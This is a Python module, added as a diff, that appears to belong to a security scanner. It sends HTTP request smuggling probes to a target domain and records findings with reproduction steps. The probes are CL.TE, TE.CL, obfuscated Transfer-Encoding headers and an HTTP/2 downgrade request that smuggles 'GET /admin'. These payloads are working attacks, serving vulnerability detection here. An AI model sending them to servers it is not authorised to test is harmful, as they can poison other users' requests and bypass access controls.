@@ -1,0 +1,438 @@
+#!/usr/bin/env python3
+"""
+HTTP Request Smuggling Detection Module
+========================================
+Based on 2025 techniques including:
+- CL.TE / TE.CL / TE.TE smuggling
+- HTTP/2 downgrade attacks
+- Chunked encoding quirks (Funky Chunks)
+- Early response gadgets
+- H2C smuggling
+
+References:
+- HTTP/1.1 Must Die
+- Funky Chunks series
+- HTTP/2 CONNECT stream exploitation
+"""
+
+import socket
+import ssl
+import time
+import re
+from typing import List, Optional, Dict, Tuple
+from dataclasses import dataclass
+
+from .base import TechniqueScanner, Finding, ScanProgress, is_shutdown
+
+
+@dataclass
+class SmugglePayload:
+    """HTTP Smuggling payload configuration"""
+    name: str
+    description: str
+    raw_request: str
+    detection_method: str  # timeout, reflection, status_diff
+    expected_behavior: str
+
+
+class HTTPSmuggling(TechniqueScanner):
+    """HTTP Request Smuggling vulnerability scanner"""
+
+    TECHNIQUE_NAME = "http_smuggling"
+    TECHNIQUE_CATEGORY = "request_manipulation"
+
+    # Standard smuggling payloads
+    PAYLOADS: List[SmugglePayload] = [
+        # CL.TE Detection
+        SmugglePayload(
+            name="CL.TE Basic",
+            description="Content-Length vs Transfer-Encoding mismatch (CL.TE)",
+            raw_request=(
+                "POST {path} HTTP/1.1\r\n"
+                "Host: {host}\r\n"
+                "Content-Type: application/x-www-form-urlencoded\r\n"
+                "Content-Length: 6\r\n"
+                "Transfer-Encoding: chunked\r\n"
+                "\r\n"
+                "0\r\n"
+                "\r\n"
+                "G"
+            ),
+            detection_method="timeout",
+            expected_behavior="Frontend uses CL (6 bytes), backend uses TE (ends at 0), G poisons next request"
+        ),
+        # TE.CL Detection
+        SmugglePayload(
+            name="TE.CL Basic",
+            description="Transfer-Encoding vs Content-Length mismatch (TE.CL)",
+            raw_request=(
+                "POST {path} HTTP/1.1\r\n"
+                "Host: {host}\r\n"
+                "Content-Type: application/x-www-form-urlencoded\r\n"
+                "Content-Length: 4\r\n"
+                "Transfer-Encoding: chunked\r\n"
+                "\r\n"
+                "5c\r\n"
+                "GPOST / HTTP/1.1\r\n"
+                "Content-Type: application/x-www-form-urlencoded\r\n"
+                "Content-Length: 15\r\n"
+                "\r\n"
+                "x=1\r\n"
+                "0\r\n"
+                "\r\n"
+            ),
+            detection_method="reflection",
+            expected_behavior="Frontend uses TE, backend uses CL (4 bytes), rest becomes next request"
+        ),
+        # TE.TE Obfuscation
+        SmugglePayload(
+            name="TE.TE Obfuscation - Space",
+            description="Transfer-Encoding obfuscation with trailing space",
+            raw_request=(
+                "POST {path} HTTP/1.1\r\n"
+                "Host: {host}\r\n"
+                "Content-Type: application/x-www-form-urlencoded\r\n"
+                "Content-Length: 4\r\n"
+                "Transfer-Encoding: chunked\r\n"
+                "Transfer-Encoding : chunked\r\n"
+                "\r\n"
+                "0\r\n"
+                "\r\n"
+            ),
+            detection_method="status_diff",
+            expected_behavior="Different servers handle duplicate TE headers differently"
+        ),
+        # Line terminator quirks
+        SmugglePayload(
+            name="Chunked LF Terminator",
+            description="Chunk using bare LF instead of CRLF (Funky Chunks)",
+            raw_request=(
+                "POST {path} HTTP/1.1\r\n"
+                "Host: {host}\r\n"
+                "Transfer-Encoding: chunked\r\n"
+                "Content-Length: 6\r\n"
+                "\r\n"
+                "0\n"
+                "\r\n"
+                "G"
+            ),
+            detection_method="timeout",
+            expected_behavior="Server may accept LF as line terminator, causing desync"
+        ),
+        # HTTP/2 to HTTP/1.1 downgrade
+        SmugglePayload(
+            name="H2.CL Injection",
+            description="HTTP/2 content-length injection during downgrade",
+            raw_request=(
+                "POST {path} HTTP/1.1\r\n"
+                "Host: {host}\r\n"
+                "Content-Length: 0\r\n"
+                "\r\n"
+                "GET /admin HTTP/1.1\r\n"
+                "Host: {host}\r\n"
+                "\r\n"
+            ),
+            detection_method="reflection",
+            expected_behavior="HTTP/2 frontend ignores CL, HTTP/1.1 backend uses it"
+        ),
+    ]
+
+    # Additional obfuscation techniques
+    TE_OBFUSCATIONS = [
+        "Transfer-Encoding: chunked",
+        "Transfer-Encoding : chunked",
+        "Transfer-Encoding: chunked ",
+        "Transfer-Encoding:\tchunked",
+        "Transfer-Encoding: xchunked",
+        " Transfer-Encoding: chunked",
+        "Transfer-Encoding: chunked\r\nX-Ignore: ",
+        "Transfer-Encoding:\n chunked",
+        "Transfer-Encoding: chunKed",
+        "Transfer-Encoding: CHUNKED",
+        "TrAnSfEr-EnCoDiNg: chunked",
+        "Transfer-Encoding: identity, chunked",
+        "Transfer-Encoding: chunked, identity",
+    ]
+
+    def __init__(self, **kwargs):
+        super().__init__(**kwargs)
+        self.socket_timeout = 10
+
+    def _raw_request(self, host: str, port: int, request: bytes, use_ssl: bool = True) -> Tuple[Optional[bytes], float]:
+        """Send raw HTTP request and measure response time"""
+        start_time = time.time()
+
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(self.socket_timeout)
+
+            if use_ssl:
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE
+                sock = context.wrap_socket(sock, server_hostname=host)
+
+            sock.connect((host, port))
+            sock.sendall(request)
+
+            response = b""
+            while True:
+                try:
+                    chunk = sock.recv(4096)
+                    if not chunk:
+                        break
+                    response += chunk
+                except socket.timeout:
+                    break
+
+            sock.close()
+            elapsed = time.time() - start_time
+            return response, elapsed
+
+        except Exception as e:
+            return None, time.time() - start_time
+
+    def _test_smuggling_payload(self, domain: str, payload: SmugglePayload) -> Optional[Dict]:
+        """Test a single smuggling payload"""
+        host = domain
+        port = 443
+        use_ssl = True
+
+        # Try both HTTP and HTTPS
+        for scheme, p, ssl_enabled in [("https", 443, True), ("http", 80, False)]:
+            if is_shutdown():
+                return None
+
+            path = "/"
+            raw_request = payload.raw_request.format(host=host, path=path)
+
+            # First request - baseline
+            baseline_req = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
+            baseline_resp, baseline_time = self._raw_request(host, p, baseline_req.encode(), ssl_enabled)
+
+            if baseline_resp is None:
+                continue
+
+            # Send smuggling payload
+            smuggle_resp, smuggle_time = self._raw_request(host, p, raw_request.encode(), ssl_enabled)
+
+            if smuggle_resp is None:
+                continue
+
+            # Detection based on method
+            finding_data = None
+
+            if payload.detection_method == "timeout":
+                # Significant delay may indicate desync
+                if smuggle_time > baseline_time * 3 and smuggle_time > 5:
+                    finding_data = {
+                        "evidence": f"Response time anomaly: baseline={baseline_time:.2f}s, smuggle={smuggle_time:.2f}s",
+                        "response_time": smuggle_time
+                    }
+
+            elif payload.detection_method == "status_diff":
+                # Check for different status codes
+                baseline_status = self._extract_status(baseline_resp)
+                smuggle_status = self._extract_status(smuggle_resp)
+
+                if baseline_status and smuggle_status and baseline_status != smuggle_status:
+                    finding_data = {
+                        "evidence": f"Status code difference: normal={baseline_status}, smuggle={smuggle_status}",
+                        "status_diff": (baseline_status, smuggle_status)
+                    }
+
+            elif payload.detection_method == "reflection":
+                # Check if smuggled content appears in response
+                if b"GPOST" in smuggle_resp or b"Invalid request" in smuggle_resp:
+                    finding_data = {
+                        "evidence": "Smuggled request content reflected or caused error",
+                        "response_snippet": smuggle_resp[:500].decode('utf-8', errors='ignore')
+                    }
+
+            if finding_data:
+                return {
+                    "payload": payload,
+                    "scheme": scheme,
+                    "evidence": finding_data,
+                    "raw_request": raw_request,
+                    "response": smuggle_resp[:2000].decode('utf-8', errors='ignore') if smuggle_resp else None
+                }
+
+        return None
+
+    def _extract_status(self, response: bytes) -> Optional[int]:
+        """Extract HTTP status code from response"""
+        if not response:
+            return None
+        try:
+            first_line = response.split(b"\r\n")[0].decode('utf-8', errors='ignore')
+            match = re.search(r'HTTP/\d+\.?\d*\s+(\d+)', first_line)
+            if match:
+                return int(match.group(1))
+        except:
+            pass
+        return None
+
+    def _test_te_obfuscation(self, domain: str) -> List[Dict]:
+        """Test various Transfer-Encoding obfuscations"""
+        findings = []
+        host = domain
+
+        baseline_te = "Transfer-Encoding: chunked"
+        baseline_req = (
+            f"POST / HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"{baseline_te}\r\n"
+            f"Content-Length: 5\r\n"
+            f"\r\n"
+            f"0\r\n\r\n"
+        )
+
+        baseline_resp, _ = self._raw_request(host, 443, baseline_req.encode(), True)
+        if not baseline_resp:
+            return findings
+
+        baseline_status = self._extract_status(baseline_resp)
+
+        for obfuscation in self.TE_OBFUSCATIONS:
+            if is_shutdown():
+                break
+
+            if obfuscation == baseline_te:
+                continue
+
+            test_req = (
+                f"POST / HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                f"{obfuscation}\r\n"
+                f"Content-Length: 5\r\n"
+                f"\r\n"
+                f"0\r\n\r\n"
+            )
+
+            test_resp, _ = self._raw_request(host, 443, test_req.encode(), True)
+            if test_resp:
+                test_status = self._extract_status(test_resp)
+
+                # Different handling indicates potential vulnerability
+                if test_status and baseline_status and test_status != baseline_status:
+                    findings.append({
+                        "obfuscation": obfuscation,
+                        "baseline_status": baseline_status,
+                        "test_status": test_status,
+                        "evidence": f"TE obfuscation handled differently: '{obfuscation}' returned {test_status} vs baseline {baseline_status}"
+                    })
+
+        return findings
+
+    def _test_http2_downgrade(self, domain: str) -> Optional[Dict]:
+        """Test for HTTP/2 to HTTP/1.1 downgrade smuggling potential"""
+        # Check if HTTP/2 is supported
+        try:
+            resp = self.get(f"https://{domain}/", allow_redirects=False)
+            if resp is None:
+                return None
+
+            # Check for HTTP/2 indicators
+            h2_indicators = []
+
+            # Check Alt-Svc header
+            if 'Alt-Svc' in resp.headers:
+                alt_svc = resp.headers['Alt-Svc']
+                if 'h2' in alt_svc:
+                    h2_indicators.append(f"Alt-Svc: {alt_svc}")
+
+            # Check upgrade header
+            if 'Upgrade' in resp.headers:
+                h2_indicators.append(f"Upgrade: {resp.headers['Upgrade']}")
+
+            if h2_indicators:
+                return {
+                    "http2_supported": True,
+                    "indicators": h2_indicators,
+                    "evidence": f"HTTP/2 support detected: {', '.join(h2_indicators)}"
+                }
+
+        except Exception as e:
+            pass
+
+        return None
+
+    def scan(self, domain: str, progress: ScanProgress) -> List[Finding]:
+        """Scan domain for HTTP smuggling vulnerabilities"""
+        findings = []
+        self.log(f"Testing HTTP smuggling on {domain}")
+
+        # Test standard smuggling payloads
+        for payload in self.PAYLOADS:
+            if is_shutdown():
+                break
+
+            self.log(f"Testing: {payload.name}")
+            result = self._test_smuggling_payload(domain, payload)
+
+            if result:
+                finding = self.create_finding(
+                    domain=domain,
+                    severity="high",
+                    title=f"Potential HTTP Smuggling: {payload.name}",
+                    description=payload.description,
+                    evidence=result["evidence"].get("evidence", ""),
+                    reproduction_steps=[
+                        f"Send the following raw HTTP request to {domain}:",
+                        result["raw_request"],
+                        "Observe the response for smuggling indicators"
+                    ],
+                    request=result["raw_request"],
+                    response=result.get("response"),
+                    payload_name=payload.name,
+                    expected_behavior=payload.expected_behavior
+                )
+                findings.append(finding)
+                progress.add_finding(domain, finding)
+
+        # Test TE obfuscation
+        if not is_shutdown():
+            self.log("Testing Transfer-Encoding obfuscations")
+            te_findings = self._test_te_obfuscation(domain)
+
+            for tf in te_findings:
+                finding = self.create_finding(
+                    domain=domain,
+                    severity="medium",
+                    title=f"TE Header Obfuscation Handling Variance",
+                    description=f"Server handles obfuscated Transfer-Encoding header differently: {tf['obfuscation']}",
+                    evidence=tf["evidence"],
+                    reproduction_steps=[
+                        f"Send request with obfuscated TE header: {tf['obfuscation']}",
+                        f"Compare response status with standard 'Transfer-Encoding: chunked'",
+                        f"Standard returned {tf['baseline_status']}, obfuscated returned {tf['test_status']}"
+                    ],
+                    obfuscation=tf["obfuscation"]
+                )
+                findings.append(finding)
+                progress.add_finding(domain, finding)
+
+        # Test HTTP/2 downgrade potential
+        if not is_shutdown():
+            self.log("Checking HTTP/2 support for downgrade potential")
+            h2_result = self._test_http2_downgrade(domain)
+
+            if h2_result:
+                finding = self.create_finding(
+                    domain=domain,
+                    severity="info",
+                    title="HTTP/2 Support Detected - Downgrade Potential",
+                    description="Server supports HTTP/2, which may be vulnerable to H2.CL or H2.TE smuggling if downgrading to HTTP/1.1",
+                    evidence=h2_result["evidence"],
+                    reproduction_steps=[
+                        "Test HTTP/2 to HTTP/1.1 downgrade scenarios",
+                        "Check if content-length or transfer-encoding can be manipulated during downgrade"
+                    ],
+                    http2_indicators=h2_result["indicators"]
+                )
+                findings.append(finding)
+                progress.add_finding(domain, finding)
+
+        self.log(f"Completed: {len(findings)} potential smuggling issues found", "success" if findings else "info")
+        return findings
